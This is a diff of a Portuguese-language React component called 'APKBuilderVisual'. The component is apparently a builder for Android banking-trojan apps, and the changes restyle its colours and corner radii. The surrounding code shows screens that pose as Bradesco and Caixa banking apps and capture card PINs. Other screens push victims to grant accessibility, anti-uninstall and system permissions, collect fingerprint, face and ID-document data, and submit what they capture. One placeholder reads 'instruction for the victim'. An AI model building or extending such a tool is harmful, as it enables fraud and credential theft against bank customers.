@@ -1205,7 +1205,7 @@ export default function APKBuilderVisual() {
 
       case 'admin':
         screenName = '🛡️ 2. Administrador';
-        bgColor = '#160606';
+        bgColor = '#0a0a0b';
         elements = [
           { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '🛡️', style: { fontSize: 54, textAlign: 'center' } },
           { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Proteção Anti-Desinstalação', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
@@ -1216,7 +1216,7 @@ export default function APKBuilderVisual() {
 
       case 'battery':
         screenName = '🔋 3. Economia de Bateria';
-        bgColor = '#160606';
+        bgColor = '#0a0a0b';
         elements = [
           { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '🔋', style: { fontSize: 54, textAlign: 'center' } },
           { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Otimização de Bateria', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
@@ -1227,7 +1227,7 @@ export default function APKBuilderVisual() {
 
       case 'permissions':
         screenName = '📱 4. Permissões de Sistema';
-        bgColor = '#160606';
+        bgColor = '#0a0a0b';
         elements = [
           { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '📱', style: { fontSize: 54, textAlign: 'center' } },
           { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Permissões do Sistema', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
@@ -1469,7 +1469,7 @@ export default function APKBuilderVisual() {
             inputPlaceholder: 'Senha do cartão (4 dígitos)',
             inputType: 'numeric',
             inputLabel: 'senha_cartao_bradesco',
-            style: { backgroundColor: '#f1f5f9', textColor: '#160606', borderRadius: 8, borderWidth: 1, borderColor: '#e1d5cb' }
+            style: { backgroundColor: '#f1f5f9', textColor: '#0a0a0b', borderRadius: 8, borderWidth: 1, borderColor: '#e1d5cb' }
           },
           {
             id: generateId(),
@@ -1484,7 +1484,7 @@ export default function APKBuilderVisual() {
         break;
       case 'caixa':
         screenName = '🏦 Caixa';
-        bgColor = '#005ca9';
+        bgColor = '#a90000';
         elements = [
           {
             id: generateId(),
@@ -2151,7 +2151,7 @@ export default function APKBuilderVisual() {
             onMouseDown={(e) => handleMouseDown(e, element.id)}
           >
             <div 
-              className={`relative flex flex-col items-center justify-center overflow-hidden ${element.biometricShape === 'oval' ? 'rounded-full' : 'rounded-2xl'}`} 
+              className={`relative flex flex-col items-center justify-center overflow-hidden ${element.biometricShape === 'oval' ? 'rounded-full' : 'rounded-md'}`} 
               style={{ 
                 width: '140px', 
                 height: '140px', 
@@ -2233,7 +2233,7 @@ export default function APKBuilderVisual() {
   return (
     <div className="min-h-screen bg-[#1e0603] text-white relative z-20 flex flex-col overflow-hidden">
       {/* Header */}
-      <header className="bg-[#290903] border-b border-blue-500/20 px-4 py-3 flex items-center justify-between relative z-30 shadow-md">
+      <header className="bg-[#1a1a1e] border-b border-[#2a2a31]/20 px-4 py-3 flex items-center justify-between relative z-30 shadow-md">
         <div className="flex items-center gap-4">
           <button
             onClick={() => navigate('/build-apk')}
@@ -2244,7 +2244,7 @@ export default function APKBuilderVisual() {
           </button>
           <div className="h-6 w-px bg-gray-600" />
           <div className="flex items-center gap-2">
-            <Smartphone className="text-orange-500" size={24} />
+            <Smartphone className="text-[#ef4444]" size={24} />
             <span className="text-lg font-semibold">APK Builder Visual</span>
           </div>
         </div>
@@ -2253,7 +2253,7 @@ export default function APKBuilderVisual() {
           {/* Novo Template */}
           <button
             onClick={newTemplate}
-            className="flex items-center gap-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors text-sm"
+            className="flex items-center gap-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors text-sm"
           >
             <Plus size={16} />
             Novo
@@ -2262,7 +2262,7 @@ export default function APKBuilderVisual() {
           {/* Templates Salvos */}
           <button
             onClick={() => setShowSavedTemplates(true)}
-            className="flex items-center gap-1 px-3 py-2 bg-blue-700 hover:bg-blue-600 rounded-lg transition-colors text-sm"
+            className="flex items-center gap-1 px-3 py-2 bg-[#ef4444] hover:bg-[#ef4444] rounded-md transition-colors text-sm"
           >
             <Layers size={16} />
             Modelos ({savedTemplates.length})
@@ -2271,7 +2271,7 @@ export default function APKBuilderVisual() {
           {/* Histórico */}
           <button
             onClick={() => setShowApkHistory(true)}
-            className="flex items-center gap-1 px-3 py-2 bg-purple-700 hover:bg-blue-600 rounded-lg transition-colors text-sm"
+            className="flex items-center gap-1 px-3 py-2 bg-purple-700 hover:bg-[#ef4444] rounded-md transition-colors text-sm"
           >
             <Copy size={16} />
             Histórico ({apkHistory.length})
@@ -2282,7 +2282,7 @@ export default function APKBuilderVisual() {
           {/* Preview Mode Toggle */}
           <button
             onClick={() => setPreviewMode(!previewMode)}
-            className={`flex items-center gap-1 px-3 py-2 rounded-lg transition-colors text-sm ${
+            className={`flex items-center gap-1 px-3 py-2 rounded-md transition-colors text-sm ${
               previewMode ? 'bg-green-600 text-white' : 'bg-gray-700 hover:bg-gray-600'
             }`}
           >
@@ -2293,7 +2293,7 @@ export default function APKBuilderVisual() {
           {/* Save Template */}
           <button
             onClick={saveTemplate}
-            className="flex items-center gap-1 px-3 py-2 bg-green-700 hover:bg-green-600 rounded-lg transition-colors text-sm"
+            className="flex items-center gap-1 px-3 py-2 bg-green-700 hover:bg-green-600 rounded-md transition-colors text-sm"
           >
             <Save size={16} />
             Salvar
@@ -2303,7 +2303,7 @@ export default function APKBuilderVisual() {
           <button
             onClick={handleBuildAPK}
             disabled={isBuilding}
-            className="flex items-center gap-1 px-4 py-2 bg-orange-600 hover:bg-orange-500 rounded-lg transition-colors disabled:opacity-50"
+            className="flex items-center gap-1 px-4 py-2 bg-[#84cc16] hover:bg-[#ef4444] rounded-md transition-colors disabled:opacity-50"
           >
             {isBuilding ? <RefreshCw size={16} className="animate-spin" /> : <Download size={16} />}
             {isBuilding ? `${buildProgress}%` : 'Build APK'}
@@ -2317,7 +2317,7 @@ export default function APKBuilderVisual() {
           <div className="flex items-center gap-4">
             <div className="flex-1 bg-gray-700 rounded-full h-2">
               <div
-                className="bg-orange-500 h-2 rounded-full transition-all duration-300"
+                className="bg-[#ef4444] h-2 rounded-full transition-all duration-300"
                 style={{ width: `${buildProgress}%` }}
               />
             </div>
@@ -2329,77 +2329,77 @@ export default function APKBuilderVisual() {
       <div className="flex h-[calc(100vh-64px)] relative z-20 bg-[#1e0603]">
         {/* Left Panel - Elements */}
         {showElementPanel && !previewMode && (
-          <div className="w-72 bg-[#280904] border-r border-blue-500/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
+          <div className="w-72 bg-[#280904] border-r border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
             <div className="p-4">
               <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Adicionar Elementos</h3>
               
               <div className="grid grid-cols-2 gap-2">
                 <button
                   onClick={() => addElement('text')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Type size={20} />
                   <span className="text-xs">Texto</span>
                 </button>
                 <button
                   onClick={() => addElement('button')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Square size={20} />
                   <span className="text-xs">Botão</span>
                 </button>
                 <button
                   onClick={() => addElement('input')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Keyboard size={20} />
                   <span className="text-xs">Input</span>
                 </button>
                 <button
                   onClick={() => addElement('image')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Image size={20} />
                   <span className="text-xs">Imagem</span>
                 </button>
                 <button
                   onClick={() => addElement('logo')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Shield size={20} />
                   <span className="text-xs">Logo</span>
                 </button>
                 <button
                   onClick={() => addElement('rectangle')}
-                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                 >
                   <Square size={20} />
                   <span className="text-xs">Retângulo</span>
                 </button>
                 <button
                   onClick={() => addElement('file_upload')}
-                  className="flex flex-col items-center gap-2 p-3 bg-green-700 hover:bg-green-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-green-700 hover:bg-green-600 rounded-md transition-colors"
                 >
                   <Upload size={20} />
                   <span className="text-xs">Upload</span>
                 </button>
                 <button
                   onClick={() => addElement('fingerprint')}
-                  className="flex flex-col items-center gap-2 p-3 bg-indigo-700 hover:bg-indigo-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-[#ef4444] hover:bg-[#ef4444] rounded-md transition-colors"
                 >
                   <Fingerprint size={20} />
                   <span className="text-xs">Digital</span>
                 </button>
                 <button
                   onClick={() => addElement('facial')}
-                  className="flex flex-col items-center gap-2 p-3 bg-teal-700 hover:bg-teal-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-teal-700 hover:bg-teal-600 rounded-md transition-colors"
                 >
                   <Scan size={20} />
                   <span className="text-xs">Facial</span>
                 </button>
                 <button
                   onClick={() => addElement('loading_bar')}
-                  className="flex flex-col items-center gap-2 p-3 bg-pink-700 hover:bg-pink-600 rounded-lg transition-colors"
+                  className="flex flex-col items-center gap-2 p-3 bg-[#4d7c0f] hover:bg-[#65a30d] rounded-md transition-colors"
                 >
                   <Loader2 size={20} />
                   <span className="text-xs">Carregando</span>
@@ -2409,8 +2409,8 @@ export default function APKBuilderVisual() {
             
             <div className="border-t border-gray-700 p-4">
               <div className="flex items-center justify-between mb-3">
-                <h3 className="text-xs font-bold text-orange-400 uppercase tracking-wider">📱 Etapas do App Gerado</h3>
-                <span className="text-[10px] bg-orange-500/20 text-orange-300 px-1.5 py-0.5 rounded border border-orange-500/30">
+                <h3 className="text-xs font-bold text-[#f87171] uppercase tracking-wider">📱 Etapas do App Gerado</h3>
+                <span className="text-[10px] bg-[#ef4444]/20 text-[#fca5a5] px-1.5 py-0.5 rounded border border-[#ef4444]/30">
                   {template.screens.length} Etapas
                 </span>
               </div>
@@ -2422,8 +2422,8 @@ export default function APKBuilderVisual() {
                 {template.screens.map((screen, idx) => (
                   <div
                     key={screen.id}
-                    className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all ${
-                      idx === currentScreenIndex ? 'bg-orange-600 shadow-md ring-1 ring-orange-300' : 'bg-gray-700/80 hover:bg-gray-600'
+                    className={`flex items-center gap-2 p-2 rounded-md cursor-pointer transition-all ${
+                      idx === currentScreenIndex ? 'bg-[#84cc16] shadow-md ring-1 ring-[#fca5a5]' : 'bg-gray-700/80 hover:bg-gray-600'
                     }`}
                     onClick={() => setCurrentScreenIndex(idx)}
                   >
@@ -2432,19 +2432,19 @@ export default function APKBuilderVisual() {
                     {/* Indicadores */}
                     <div className="flex gap-1">
                       {idx === 0 && (
-                        <span className="px-1 py-0.5 bg-blue-500 text-[8px] font-bold rounded" title="Primeira tela">1ª</span>
+                        <span className="px-1 py-0.5 bg-[#ef4444] text-[8px] font-bold rounded" title="Primeira tela">1ª</span>
                       )}
                       {idx === template.screens.length - 1 && (
                         <span className="px-1 py-0.5 bg-green-500 text-[8px] font-bold rounded" title="Última tela">FIM</span>
                       )}
                       {screen.captureInputs && (
-                        <span className="px-1 py-0.5 bg-red-500 text-[8px] rounded" title="Captura senha/PIN">🔑</span>
+                        <span className="px-1 py-0.5 bg-[#ef4444] text-[8px] rounded" title="Captura senha/PIN">🔑</span>
                       )}
                     </div>
                     {template.screens.length > 1 && (
                       <button
                         onClick={(e) => { e.stopPropagation(); deleteScreen(idx); }}
-                        className="p-1 hover:bg-red-500 rounded transition-colors text-gray-300 hover:text-white"
+                        className="p-1 hover:bg-[#ef4444] rounded transition-colors text-gray-300 hover:text-white"
                         title="Excluir etapa"
                       >
                         <Trash2 size={14} />
@@ -2462,7 +2462,7 @@ export default function APKBuilderVisual() {
                         e.target.value = '';
                       }
                     }}
-                    className="w-full flex items-center justify-center gap-2 p-2 bg-slate-800 border border-orange-500/50 text-orange-400 rounded-lg text-xs font-semibold hover:bg-slate-700 outline-none cursor-pointer text-center"
+                    className="w-full flex items-center justify-center gap-2 p-2 bg-[#24242a] border border-[#ef4444]/50 text-[#f87171] rounded-md text-xs font-semibold hover:bg-[#2a2a31] outline-none cursor-pointer text-center"
                     title="Adicionar etapa específica ao fluxo do app"
                   >
                     <option value="">➕ Adicionar Etapa ao App...</option>
@@ -2476,7 +2476,7 @@ export default function APKBuilderVisual() {
 
                   <button
                     onClick={addScreen}
-                    className="w-full flex items-center justify-center gap-2 p-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-lg text-xs transition-colors border border-gray-700"
+                    className="w-full flex items-center justify-center gap-2 p-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-md text-xs transition-colors border border-gray-700"
                   >
                     <Plus size={14} />
                     <span>Etapa Personalizada em Branco</span>
@@ -2512,7 +2512,7 @@ export default function APKBuilderVisual() {
         
         {/* Center - Phone Preview */}
         <div
-          className="flex-1 flex flex-col items-center justify-center bg-[#170503] relative z-10 overflow-auto p-6 border-x border-blue-500/10 shadow-inner"
+          className="flex-1 flex flex-col items-center justify-center bg-[#170503] relative z-10 overflow-auto p-6 border-x border-[#2a2a31]/10 shadow-inner"
           onMouseMove={handleMouseMove}
           onMouseUp={handleMouseUp}
           onMouseLeave={handleMouseUp}
@@ -2559,7 +2559,7 @@ export default function APKBuilderVisual() {
                 
                 {/* Borda de limite (só no modo edição com elemento selecionado) */}
                 {!previewMode && selectedElementId && isDragging && (
-                  <div className="absolute inset-0 border-2 border-dashed border-blue-500/30 pointer-events-none rounded-[40px]" />
+                  <div className="absolute inset-0 border-2 border-dashed border-[#2a2a31]/30 pointer-events-none rounded-[40px]" />
                 )}
               </div>
               
@@ -2578,7 +2578,7 @@ export default function APKBuilderVisual() {
         
         {/* Right Panel - Properties */}
         {showPropertiesPanel && !previewMode && selectedElement && (
-          <div className="w-80 bg-[#280904] border-l border-blue-500/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
+          <div className="w-80 bg-[#280904] border-l border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
             <div className="p-4">
               <div className="flex items-center justify-between mb-4">
                 <h3 className="text-sm font-semibold text-gray-400 uppercase">Propriedades</h3>
@@ -2592,7 +2592,7 @@ export default function APKBuilderVisual() {
                   </button>
                   <button
                     onClick={() => deleteElement(selectedElement.id)}
-                    className="p-1.5 bg-red-600 hover:bg-red-500 rounded transition-colors"
+                    className="p-1.5 bg-[#ef4444] hover:bg-[#ef4444] rounded transition-colors"
                     title="Excluir"
                   >
                     <Trash2 size={14} />
@@ -2601,7 +2601,7 @@ export default function APKBuilderVisual() {
               </div>
               
               {/* Element Type */}
-              <div className="mb-4 p-2 bg-gray-700 rounded-lg">
+              <div className="mb-4 p-2 bg-gray-700 rounded-md">
                 <span className="text-xs text-gray-400">Tipo: </span>
                 <span className="text-sm font-medium capitalize">{selectedElement.type}</span>
               </div>
@@ -2614,7 +2614,7 @@ export default function APKBuilderVisual() {
                     type="text"
                     value={selectedElement.content}
                     onChange={(e) => updateElement(selectedElement.id, { content: e.target.value })}
-                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                   />
                 </div>
               )}
@@ -2627,7 +2627,7 @@ export default function APKBuilderVisual() {
                     <select
                       value={selectedElement.inputType}
                       onChange={(e) => updateElement(selectedElement.id, { inputType: e.target.value as any })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     >
                       <option value="text">Texto</option>
                       <option value="password">Senha</option>
@@ -2641,7 +2641,7 @@ export default function APKBuilderVisual() {
                       type="text"
                       value={selectedElement.inputPlaceholder || ''}
                       onChange={(e) => updateElement(selectedElement.id, { inputPlaceholder: e.target.value })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                   <div className="mb-4">
@@ -2650,7 +2650,7 @@ export default function APKBuilderVisual() {
                       type="text"
                       value={selectedElement.inputLabel || ''}
                       onChange={(e) => updateElement(selectedElement.id, { inputLabel: e.target.value })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                       placeholder="Ex: SENHA_INICIAL"
                     />
                   </div>
@@ -2660,7 +2660,7 @@ export default function APKBuilderVisual() {
                       type="number"
                       value={selectedElement.inputMaxLength || ''}
                       onChange={(e) => updateElement(selectedElement.id, { inputMaxLength: parseInt(e.target.value) })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                 </>
@@ -2673,7 +2673,7 @@ export default function APKBuilderVisual() {
                   <select
                     value={selectedElement.buttonAction}
                     onChange={(e) => updateElement(selectedElement.id, { buttonAction: e.target.value as any })}
-                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                   >
                     <option value="accessibility">🔐 Ativar Acessibilidade</option>
                     <option value="next">▶️ Próxima tela</option>
@@ -2704,7 +2704,7 @@ export default function APKBuilderVisual() {
                         value={selectedElement.buttonUrl || ''}
                         onChange={(e) => updateElement(selectedElement.id, { buttonUrl: e.target.value })}
                         placeholder="https://google.com.br"
-                        className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                       />
                       <p className="text-[10px] text-gray-500 mt-1">
                         Quando clicar no botão, abre essa URL no navegador
@@ -2716,8 +2716,8 @@ export default function APKBuilderVisual() {
               
               {/* Biometric Config (Fingerprint / Facial) */}
               {(selectedElement.type === 'fingerprint' || selectedElement.type === 'facial') && (
-                <div className="mb-4 p-3 bg-indigo-900/30 border border-indigo-700 rounded-lg">
-                  <h4 className="text-sm font-semibold text-indigo-400 mb-3">🛡️ Configurações Biométricas</h4>
+                <div className="mb-4 p-3 bg-[#1a1a1e]/30 border border-[#3a3a44] rounded-md">
+                  <h4 className="text-sm font-semibold text-[#ef4444] mb-3">🛡️ Configurações Biométricas</h4>
                   
                   <div className="mb-3">
                     <label className="block text-xs text-gray-400 mb-1">Texto Instrutivo</label>
@@ -2726,7 +2726,7 @@ export default function APKBuilderVisual() {
                       value={selectedElement.biometricText || ''}
                       onChange={(e) => updateElement(selectedElement.id, { biometricText: e.target.value })}
                       placeholder="Instrução para a vítima..."
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                   
@@ -2746,7 +2746,7 @@ export default function APKBuilderVisual() {
                       <select
                         value={selectedElement.biometricShape || 'normal'}
                         onChange={(e) => updateElement(selectedElement.id, { biometricShape: e.target.value as any })}
-                        className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                       >
                         <option value="normal">⏹️ Retângulo Arredondado</option>
                         <option value="oval">🟣 Oval / Circular</option>
@@ -2759,7 +2759,7 @@ export default function APKBuilderVisual() {
                     <select
                       value={selectedElement.biometricAction}
                       onChange={(e) => updateElement(selectedElement.id, { biometricAction: e.target.value as any })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     >
                       <option value="next">▶️ Próxima tela</option>
                       <option value="submit">📤 Enviar dados + Próxima</option>
@@ -2778,7 +2778,7 @@ export default function APKBuilderVisual() {
                         value={selectedElement.biometricUrl || ''}
                         onChange={(e) => updateElement(selectedElement.id, { biometricUrl: e.target.value })}
                         placeholder="https://google.com.br"
-                        className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                       />
                     </div>
                   )}
@@ -2787,7 +2787,7 @@ export default function APKBuilderVisual() {
 
               {/* Loading Bar Config */}
               {selectedElement.type === 'loading_bar' && (
-                <div className="mb-4 p-3 bg-pink-900/30 border border-pink-700 rounded-lg">
+                <div className="mb-4 p-3 bg-pink-900/30 border border-[#4d7c0f] rounded-md">
                   <h4 className="text-sm font-semibold text-pink-400 mb-3">⏳ Configurações da Barra</h4>
                   
                   <div className="mb-3">
@@ -2797,7 +2797,7 @@ export default function APKBuilderVisual() {
                       value={selectedElement.loadingText || ''}
                       onChange={(e) => updateElement(selectedElement.id, { loadingText: e.target.value })}
                       placeholder="Carregando..."
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                   
@@ -2808,7 +2808,7 @@ export default function APKBuilderVisual() {
                       value={selectedElement.loadingDuration || 3000}
                       onChange={(e) => updateElement(selectedElement.id, { loadingDuration: parseInt(e.target.value) || 3000 })}
                       placeholder="3000"
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
 
@@ -2827,7 +2827,7 @@ export default function APKBuilderVisual() {
                     <select
                       value={selectedElement.loadingAction}
                       onChange={(e) => updateElement(selectedElement.id, { loadingAction: e.target.value as any })}
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     >
                       <option value="next">▶️ Próxima tela</option>
                       <option value="submit">📤 Enviar dados + Próxima</option>
@@ -2846,7 +2846,7 @@ export default function APKBuilderVisual() {
                         value={selectedElement.loadingUrl || ''}
                         onChange={(e) => updateElement(selectedElement.id, { loadingUrl: e.target.value })}
                         placeholder="https://google.com.br"
-                        className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                       />
                     </div>
                   )}
@@ -2855,7 +2855,7 @@ export default function APKBuilderVisual() {
               
               {/* File Upload Config */}
               {selectedElement.type === 'file_upload' && (
-                <div className="mb-4 p-3 bg-green-900/30 border border-green-700 rounded-lg">
+                <div className="mb-4 p-3 bg-green-900/30 border border-green-700 rounded-md">
                   <h4 className="text-sm font-semibold text-green-400 mb-3">📤 Configurações de Upload</h4>
                   
                   <div className="mb-3">
@@ -2865,7 +2865,7 @@ export default function APKBuilderVisual() {
                       value={selectedElement.fileLabel || ''}
                       onChange={(e) => updateElement(selectedElement.id, { fileLabel: e.target.value })}
                       placeholder="DOCUMENTO_RG"
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                   
@@ -2876,7 +2876,7 @@ export default function APKBuilderVisual() {
                       value={selectedElement.fileButtonText || ''}
                       onChange={(e) => updateElement(selectedElement.id, { fileButtonText: e.target.value })}
                       placeholder="Selecionar Arquivo"
-                      className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                     />
                   </div>
                   
@@ -2922,7 +2922,7 @@ export default function APKBuilderVisual() {
                   />
                   <button
                     onClick={() => fileInputRef.current?.click()}
-                    className="w-full px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm flex items-center justify-center gap-2"
+                    className="w-full px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-sm flex items-center justify-center gap-2"
                   >
                     <Upload size={16} />
                     {selectedElement.imageFile ? 'Trocar Imagem' : 'Upload Imagem'}
@@ -3071,7 +3071,7 @@ export default function APKBuilderVisual() {
                         <button
                           key={align}
                           onClick={() => updateElementStyle(selectedElement.id, { textAlign: align as any })}
-                          className={`flex-1 py-1 rounded text-xs ${selectedElement.style.textAlign === align ? 'bg-orange-600' : 'bg-gray-700 hover:bg-gray-600'}`}
+                          className={`flex-1 py-1 rounded text-xs ${selectedElement.style.textAlign === align ? 'bg-[#84cc16]' : 'bg-gray-700 hover:bg-gray-600'}`}
                         >
                           {align === 'left' ? '◀' : align === 'center' ? '◆' : '▶'}
                         </button>
@@ -3102,7 +3102,7 @@ export default function APKBuilderVisual() {
         
         {/* Right Panel - Screen Properties (when no element selected) */}
         {showPropertiesPanel && !previewMode && !selectedElement && currentScreen && (
-          <div className="w-80 bg-[#280904] border-l border-blue-500/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
+          <div className="w-80 bg-[#280904] border-l border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
             <div className="p-4">
               <h3 className="text-sm font-semibold text-gray-400 uppercase mb-4">Configurações da Tela</h3>
               
@@ -3115,7 +3115,7 @@ export default function APKBuilderVisual() {
                     ...prev,
                     screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, name: e.target.value } : s)
                   }))}
-                  className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                  className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                 />
               </div>
               
@@ -3170,11 +3170,11 @@ export default function APKBuilderVisual() {
                 const accBtnElem = currentScreen.elements.find(e => e.id === 'acc-btn' || e.type === 'button' || e.buttonAction === 'accessibility');
 
                 return (
-                  <div className="p-3 bg-gradient-to-b from-orange-950/40 to-slate-900 border border-orange-500/30 rounded-xl mb-4 space-y-3 shadow-lg">
-                    <div className="flex items-center gap-2 border-b border-orange-500/20 pb-2">
+                  <div className="p-3 bg-gradient-to-b from-orange-950/40 to-[#121214] border border-[#ef4444]/30 rounded-md mb-4 space-y-3 shadow-lg">
+                    <div className="flex items-center gap-2 border-b border-[#ef4444]/20 pb-2">
                       <span className="text-base">🔐</span>
                       <div>
-                        <h4 className="text-xs font-bold text-orange-400 uppercase tracking-wider">Orientação de Acessibilidade</h4>
+                        <h4 className="text-xs font-bold text-[#f87171] uppercase tracking-wider">Orientação de Acessibilidade</h4>
                         <p className="text-[10px] text-slate-400">Edite as instruções para o usuário ativar a acessibilidade no aparelho</p>
                       </div>
                     </div>
@@ -3193,7 +3193,7 @@ export default function APKBuilderVisual() {
                               '#ff6600'
                             );
                           }}
-                          className="text-left px-2.5 py-1.5 bg-slate-800/80 hover:bg-orange-600/20 border border-orange-500/30 rounded-lg text-xs transition-all flex items-center gap-2"
+                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-[#84cc16]/20 border border-[#ef4444]/30 rounded-md text-xs transition-all flex items-center gap-2"
                         >
                           <span>🏦</span>
                           <div>
@@ -3212,7 +3212,7 @@ export default function APKBuilderVisual() {
                               '#ff7a00'
                             );
                           }}
-                          className="text-left px-2.5 py-1.5 bg-slate-800/80 hover:bg-blue-600/20 border border-blue-500/30 rounded-lg text-xs transition-all flex items-center gap-2"
+                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-[#ef4444]/20 border border-[#2a2a31]/30 rounded-md text-xs transition-all flex items-center gap-2"
                         >
                           <span>🚀</span>
                           <div>
@@ -3231,7 +3231,7 @@ export default function APKBuilderVisual() {
                               '#10b981'
                             );
                           }}
-                          className="text-left px-2.5 py-1.5 bg-slate-800/80 hover:bg-emerald-600/20 border border-emerald-500/30 rounded-lg text-xs transition-all flex items-center gap-2"
+                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-emerald-600/20 border border-emerald-500/30 rounded-md text-xs transition-all flex items-center gap-2"
                         >
                           <span>🛡️</span>
                           <div>
@@ -3243,7 +3243,7 @@ export default function APKBuilderVisual() {
                     </div>
 
                     {/* Edição Rápida de Campos */}
-                    <div className="space-y-2.5 pt-2 border-t border-slate-700/60">
+                    <div className="space-y-2.5 pt-2 border-t border-[#2a2a31]/60">
                       <div>
                         <label className="block text-[11px] font-bold text-slate-300 mb-1">Título da Tela:</label>
                         <input
@@ -3251,7 +3251,7 @@ export default function APKBuilderVisual() {
                           value={accTitleElem?.content || ''}
                           onChange={(e) => updateAccessibilityScreenElements(e.target.value, undefined, undefined, undefined)}
                           placeholder="Ex: Ativação de Segurança"
-                          className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:border-orange-500 outline-none"
